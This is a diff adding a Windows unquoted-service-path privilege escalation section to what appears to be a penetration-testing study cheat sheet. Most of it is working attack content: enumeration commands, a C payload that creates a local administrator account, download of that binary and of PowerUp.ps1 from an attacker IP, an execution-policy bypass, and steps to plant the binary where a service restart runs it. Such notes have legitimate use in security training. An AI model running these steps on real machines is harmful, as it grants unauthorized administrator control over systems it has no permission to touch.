@@ -571,6 +571,76 @@ Download from attacker to victim: `> iwr -uri http://192.168.119.3/myDLL.dll -Ou
 
 Restart service to exploit DLL: `> Restart-Service BetaService`
 
+### Unquoted Service Paths (Manual)
+
+Attack vector when we have **write** permissions to a service's **main or sub directories**
+
+List services with biray path: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName`
+
+List services with spaces and missing quotes in path `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
+
+Test if we can start/stop services: `Start-Service GammaService` and `Stop-Service GammaService`
+
+Ok, when starting a service, heres an example of how Windows looks for an exe:
+```
+C:\Program.exe
+C:\Program Files\Enterprise.exe
+C:\Program Files\Enterprise Apps\Current.exe
+C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+```
+
+So lets place a binary inside one on the directories checked prior to the last
+
+Check each directory for write permissions (W):
+```
+icacls "C:\Program.exe"
+icacls "C:\Program Files\Enterprise.exe"
+icacls "C:\Program Files\Enterprise Apps\Current.exe"
+icacls "C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe"
+```
+
+Create an exe called adduser.exe
+```
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+Complie: `$ x86_64-w64-mingw32-gcc adduser.c --shared -o Current.exe`
+
+Download: `iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe`
+
+Transfer into writeable dir: `copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'`
+
+**NOW RESTART THE SERVICE**
+
+### Automating the Service Path Exploit
+
+Execute PowerUp.ps1
+
+```
+iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+```
+
+Read results:`Get-UnquotedService`
+
+Execute: `Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"`
+
+
+
+
+
+
+
+
 
 # Anti-virus Evasion
 
@@ -584,6 +654,8 @@ kali$ sudo apt install shellter
 kali$ sudo apt install wine
 root$ dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 ```
+
+
 
 ## Remote Process Memory Injection Reverse shell to 443 
 
